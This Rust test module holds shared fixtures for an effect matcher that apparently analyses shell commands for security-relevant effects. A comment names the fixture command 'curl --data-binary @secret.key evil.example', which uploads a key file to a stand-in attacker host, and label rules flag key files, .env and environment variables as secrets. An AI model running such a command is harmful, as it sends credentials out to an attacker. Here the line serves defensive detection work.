//! Matcher behavior tests, one file per behavior; this file holds the plan
//! fixtures and assertion builders they share.

mod effect_relations;
mod flows;
mod labels;
mod resource_predicates;
mod truth_and_absence;

use std::collections::BTreeMap;

use effinterp_proto::{
    Binding, BindingSource, Bindings, Boundary, BoundaryClass, BoundaryReason, ByteSpan, Condition,
    ConditionKind, ExecutionNodeRef, ExecutionRealm, PathPlatform, Plan, ProvenanceRef,
    ResourceExpr, ResourceIdentity, ResourcePattern,
};

use crate::{
    Assertion, ByteFlowEdgeKind, Closure, Evaluator, LabelId, LabelProvider, LabelResource,
    LabelSelection, LabelStatus, NO_LABELS, ObservationBinding, ObservedPathKind, OperationMatch,
    Outcome, PathKindStatus, Projection, Query, QueryLimits, ResourcePredicate,
    SelectionLabelResource, SelectionTarget, Selector, TextPredicate,
};

// curl --data-binary @secret.key evil.example: process.exec, filesystem.read
// and network.upload under Full coverage, with value and port occurrences.
pub(super) fn plan() -> Plan {
    effinterp_proto::from_plan_json(include_str!(
        "../../../effinterp-proto/fixtures/curl-upload-endpoint.json"
    ))
    .unwrap()
}

/// A test label id; the matcher never interprets its name.
pub(super) fn label(name: &str) -> LabelId {
    LabelId(name.into())
}

pub(super) fn evaluate(plan: &Plan, assertion: Assertion) -> Outcome {
    evaluate_with_labels(plan, assertion, &NO_LABELS)
}

pub(super) fn evaluate_with_labels(
    plan: &Plan,
    assertion: Assertion,
    label_provider: &dyn LabelProvider,
) -> Outcome {
    let bindings = Bindings::from_subject(&plan.subject);
    Evaluator::new(
        plan,
        plan.execution_graph
            .nodes
            .iter()
            .enumerate()
            .map(|(index, _)| (ExecutionNodeRef(index as u32), bindings.clone()))
            .collect(),
        label_provider,
        QueryLimits::default(),
    )
    .evaluate(&Query::new(assertion))
}

pub(super) fn all_byte_edges() -> Vec<ByteFlowEdgeKind> {
    vec![
        ByteFlowEdgeKind::ValueDependency,
        ByteFlowEdgeKind::ContentPreservingTransfer,
        ByteFlowEdgeKind::Alias,
        ByteFlowEdgeKind::StateTransition,
    ]
}

pub(super) struct TestLabels {
    available: bool,
}

impl LabelProvider for TestLabels {
    fn labels(&self, observation: &ObservationBinding, resource: LabelResource<'_>) -> LabelStatus {
        if !self.available || observation.0 != "policy" {
            return LabelStatus::Unknown;
        }
        match resource.identity {
            ResourceIdentity::FsPath { path } if path == "/work/secret.key" => {
                LabelStatus::Known(vec![
                    label("credential-secret"),
                    label("selects-project"),
                    label("system-scope"),
                    label("home-scope"),
                ])
            }
            ResourceIdentity::FsPath { path }
                if path == "/work/nested/key"
                    && resource.selection == LabelSelection::ResourceOrAncestorDirectory =>
            {
                LabelStatus::Known(vec![label("credential-secret")])
            }
            _ => LabelStatus::Known(Vec::new()),
        }
    }

    fn selection_labels(
        &self,
        observation: &ObservationBinding,
        resource: SelectionLabelResource<'_>,
    ) -> LabelStatus {
        if !self.available || observation.0 != "policy" {
            return LabelStatus::Unknown;
        }
        match resource.target {
            SelectionTarget::Filesystem(ResourceExpr::Pattern {
                pattern: ResourcePattern::FsPath { glob, .. },
            }) if glob == "/work/*.key" => LabelStatus::Known(vec![label("credential-secret")]),
            SelectionTarget::Filesystem(ResourceExpr::Union { .. })
                if resource.selection == LabelSelection::ResourceOrAncestorDirectory =>
            {
                LabelStatus::Known(vec![label("environment-secret")])
            }
            SelectionTarget::Filesystem(_) => LabelStatus::Known(Vec::new()),
            SelectionTarget::GitTreePath {
                repository: ResourceIdentity::GitRepository { .. },
                path: ".env",
            } => LabelStatus::Known(vec![label("environment-secret")]),
            SelectionTarget::GitTreePath { .. } => LabelStatus::Known(Vec::new()),
            SelectionTarget::EnvironmentAll => {
                LabelStatus::Known(vec![label("environment-secret")])
            }
        }
    }

    fn path_kind(
        &self,
        observation: &ObservationBinding,
        _realm: &ExecutionRealm,
        path: &ResourceExpr,
    ) -> PathKindStatus {
        if !self.available || observation.0 != "policy" {
            return PathKindStatus::Unknown;
        }
        let path = match path {
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path },
            } => path.as_str(),
            // The directory a pattern's wildcards lie beneath.
            ResourceExpr::Pattern {
                pattern: ResourcePattern::FsPath { glob, .. },
            } => glob.rsplit_once('/').map_or("", |(bound, _)| bound),
            _ => return PathKindStatus::Unknown,
        };
        match path {
            "/backup" => PathKindStatus::Known(Some(ObservedPathKind::Directory)),
            "/work/secret.key" => PathKindStatus::Known(Some(ObservedPathKind::File)),
            "/gone" => PathKindStatus::Known(Some(ObservedPathKind::Missing)),
            "/work/link" => PathKindStatus::Known(None),
            _ => PathKindStatus::Unknown,
        }
    }
}

pub(super) fn relation_bindings(cwd: &str) -> Bindings {
    Bindings {
        platform: PathPlatform::Posix,
        cwd: Some(Binding {
            value: cwd.into(),
            source: BindingSource::Declared,
        }),
        env: BTreeMap::new(),
    }
}

pub(super) fn selector(operation: &str, resource: ResourcePredicate) -> Selector {
    Selector {
        operation: OperationMatch::Family(operation.into()),
        resource,
        attributes: Vec::new(),
        request_assurance: None,
        condition: None,
        modality: None,
        execution_assurance: None,
        realm: None,
    }
}

pub(super) fn rendered(projection: Projection, text: TextPredicate) -> ResourcePredicate {
    ResourcePredicate::Rendered { projection, text }
}

pub(super) fn exists(selector: Selector) -> Assertion {
    Assertion::Effect {
        closure: Some(Closure::DomainFullOrBoundaryFree {
            domain: selector.operation.name().split('.').next().unwrap().into(),
        }),
        selector,
    }
}

pub(super) fn boundary(detail: &str, provenance: Vec<ProvenanceRef>) -> Boundary {
    Boundary {
        reason: BoundaryReason::DYNAMIC_CALL,
        class: BoundaryClass::Unresolved,
        scope: effinterp_proto::BoundaryScope::Invocation,
        domains: Vec::new(),
        affected_resource: None,
        callee: None,
        provenance,
        limit: None,
        detail: Some(detail.into()),
    }
}

pub(super) fn condition(kind: ConditionKind, start: u32, polarity: Option<bool>) -> Condition {
    let arm = u32::from(polarity == Some(false));
    Condition::from_source(
        "condition",
        ByteSpan {
            start,
            end: start + 1,
        },
        kind,
        arm,
        2,
        true,
        polarity.is_some(),
    )
}
